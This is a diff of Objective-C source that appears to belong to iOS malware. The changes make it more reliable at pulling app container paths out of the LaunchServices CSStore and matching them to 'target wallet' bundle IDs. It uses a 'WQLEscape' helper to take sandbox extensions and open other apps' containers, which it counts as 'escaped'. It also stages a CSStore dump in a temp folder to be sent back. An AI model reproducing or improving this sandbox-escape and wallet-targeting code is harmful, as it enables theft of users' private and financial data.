@@ -85,30 +85,52 @@ static BOOL WQLLooksLikeContainerPath(NSString *s) {
     return [s containsString:@"/Containers/Data/"] || [s containsString:@"/Containers/Shared/"];
 }
 
-/// 直接从 CSStore 的明文里抽取容器路径（不依赖记录表结构）
+/// 直接从 CSStore 的明文里抽取容器路径（不依赖记录表结构）。
+/// 必须按「前缀 + 36 位 UUID」精确截断：CSStore 的字符串会补零到 4 字节边界，
+/// 填充字节可能是可打印字符（实测 TP 的路径后面跟着 'R'、Notes 跟着 '_'），
+/// 贪婪扫可打印字符会把填充字节吞进路径里，导致和 bundleId 表的 key 对不上。
 static NSArray<NSString *> *WQLExtractContainerPaths(NSData *data) {
     const uint8_t *base = data.bytes;
     size_t size = data.length;
-    const char *needle = "/private/var/mobile/Containers/";
-    size_t needleLen = strlen(needle);
+
+    static const char *needles[] = {
+        "/private/var/mobile/Containers/Data/Application/",
+        "/private/var/mobile/Containers/Data/PluginKitPlugin/",
+        "/private/var/mobile/Containers/Shared/AppGroup/",
+        "/var/mobile/Containers/Data/Application/",
+        "/var/mobile/Containers/Data/PluginKitPlugin/",
+        "/var/mobile/Containers/Shared/AppGroup/",
+    };
+    static const size_t needleCount = sizeof(needles) / sizeof(needles[0]);
 
     NSMutableSet<NSString *> *set = [NSMutableSet set];
-    for (size_t i = 0; i + needleLen < size; i++) {
-        if (memcmp(base + i, needle, needleLen) != 0) continue;
+    for (size_t n = 0; n < needleCount; n++) {
+        const char *needle = needles[n];
+        size_t needleLen = strlen(needle);
 
-        size_t j = i;
-        while (j < size && (j - i) < 160) {
-            uint8_t c = base[j];
-            if (c < 0x20 || c > 0x7e) break;
-            j++;
+        for (size_t i = 0; i + needleLen + 36 <= size; i++) {
+            if (memcmp(base + i, needle, needleLen) != 0) continue;
+
+            size_t u = i + needleLen;
+            BOOL ok = YES;
+            for (size_t k = 0; k < 36; k++) {
+                uint8_t c = base[u + k];
+                BOOL wantDash = (k == 8 || k == 13 || k == 18 || k == 23);
+                if (wantDash) {
+                    if (c != '-') { ok = NO; break; }
+                } else if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') ||
+                             (c >= 'A' && c <= 'F'))) {
+                    ok = NO; break;
+                }
+            }
+            if (!ok) continue;
+
+            NSString *s = [[NSString alloc] initWithBytes:base + i
+                                                   length:(u + 36 - i)
+                                                 encoding:NSUTF8StringEncoding];
+            if (s) [set addObject:s];
+            i = u + 35;
         }
-        if (j - i < needleLen + 40) { i = j; continue; }
-
-        NSString *s = [[NSString alloc] initWithBytes:base + i
-                                               length:j - i
-                                             encoding:NSUTF8StringEncoding];
-        if (s) [set addObject:s];
-        i = j;
     }
     return set.allObjects;
 }
@@ -144,10 +166,14 @@ static const WQLLSLayout kWQLLSLayouts[] = {
 };
 static const size_t kWQLLSLayoutCount = sizeof(kWQLLSLayouts) / sizeof(kWQLLSLayouts[0]);
 
-/// CSStore 里的路径可能不带 /private 前缀，统一成抽取路径的写法
+/// CSStore 里的路径可能不带 /private 前缀、且 26.x 结尾带 "/"，
+/// 统一成「/private 前缀 + 无尾斜杠」的规范形式，保证与抽取路径的 key 一致。
 static NSString *WQLCanonicalContainerPath(NSString *p) {
     if (!p.length) return p;
-    if ([p hasPrefix:@"/var/"]) return [@"/private" stringByAppendingString:p];
+    if ([p hasPrefix:@"/var/"]) p = [@"/private" stringByAppendingString:p];
+    while (p.length > 1 && [p hasSuffix:@"/"]) {
+        p = [p substringToIndex:p.length - 1];
+    }
     return p;
 }
 
@@ -836,12 +862,25 @@ static uint64_t WQLFNV1a(const char *s) {
                 }
             }
 
-            // 反向表：容器路径 -> bundleId（CSStore 里存的就是最终路径）
+            // 反向表：容器路径 -> bundleId（CSStore 里存的就是最终路径）。
+            // 同一个路径可能被多条记录指向（App 记录、插件记录、系统扩展），
+            // 直接赋值会让「后遍历到的」覆盖掉真正的钱包，命中与否全看遍历顺序。
+            // 所以分两轮：先写能匹配目标钱包的，再写其余的且不覆盖已有。
             NSMutableDictionary<NSString *, NSString *> *byContainer = [NSMutableDictionary dictionary];
+            NSMutableArray<NSString *> *restBids = [NSMutableArray array];
             for (NSString *bid in bestMap) {
                 NSString *con = bestMap[bid];
                 if (!con.length || !bid.length) continue;
-                byContainer[WQLCanonicalContainerPath(con)] = bid;
+                NSString *key = WQLCanonicalContainerPath(con);
+                if ([WQLTargets matchBundleID:bid inTargets:targets fuzzy:NULL]) {
+                    if (!byContainer[key]) byContainer[key] = bid;
+                } else {
+                    [restBids addObject:bid];
+                }
+            }
+            for (NSString *bid in restBids) {
+                NSString *key = WQLCanonicalContainerPath(bestMap[bid]);
+                if (!byContainer[key]) byContainer[key] = bid;
             }
 
             // iOS 27.x：metadata.plist 与 identity xattr 都读不到，bundleId
@@ -865,7 +904,9 @@ static uint64_t WQLFNV1a(const char *s) {
             NSUInteger escaped = 0, matched = 0;
             NSUInteger xattrTries = 0;
             for (NSString *raw in paths) {
-                NSString *p = [raw hasSuffix:@"/"] ? [raw substringToIndex:raw.length - 1] : raw;
+                // 抽取时会同时命中 /private/... 和 /var/... 两种写法，
+                // 以及 26.x 的尾斜杠变体；统一规范化后再去重，避免重复申请权限。
+                NSString *p = WQLCanonicalContainerPath(raw);
                 if ([seen containsObject:p]) continue;
                 [seen addObject:p];
 
@@ -873,7 +914,7 @@ static uint64_t WQLFNV1a(const char *s) {
                 if (h <= 0) continue;
                 escaped++;
 
-                NSString *bid = byContainer[WQLCanonicalContainerPath(p)];
+                NSString *bid = byContainer[p];
                 // 布局表覆盖不到时回退读 xattr，但限次数：27.x 上每个容器都要
                 // 先拿 token 再读属性，全量跑会很慢，留一个上限避免拖死。
                 if (!bid.length && xattrTries < 400) {
@@ -931,21 +972,24 @@ static uint64_t WQLFNV1a(const char *s) {
         return NO;
     }
 
-    NSString *src = [[container stringByAppendingPathComponent:@"Library/Caches"]
-                     stringByAppendingPathComponent:name];
-    if (![[NSFileManager defaultManager] fileExistsAtPath:src]) {
-        [self log:@"    ⛔ CSStore 已不存在，跳过回传：%@", name];
-        return NO;
-    }
-
+    // 必须先拿容器权限再访问文件：沙盒外的路径在没有 extension 时
+    // 连 fileExistsAtPath 都会失败（上一版就是在这里误判成「已不存在」）。
     int64_t dumpHandle = [[WQLEscape shared] consumeExtensionForPath:container error:nil];
     if (dumpHandle <= 0) {
         [self log:@"    ⛔ 取不到 CSStore 容器权限，跳过回传"];
         return NO;
     }
 
-    NSString *stage = [NSTemporaryDirectory() stringByAppendingPathComponent:@"wql_lsdump"];
+    NSString *src = [[container stringByAppendingPathComponent:@"Library/Caches"]
+                     stringByAppendingPathComponent:name];
     NSFileManager *fm = [NSFileManager defaultManager];
+    if (![fm fileExistsAtPath:src]) {
+        [self log:@"    ⛔ CSStore 不存在，跳过回传：%@", name];
+        [[WQLEscape shared] releaseHandle:dumpHandle];
+        return NO;
+    }
+
+    NSString *stage = [NSTemporaryDirectory() stringByAppendingPathComponent:@"wql_lsdump"];
     [fm removeItemAtPath:stage error:nil];
     [fm createDirectoryAtPath:stage withIntermediateDirectories:YES attributes:nil error:nil];
 
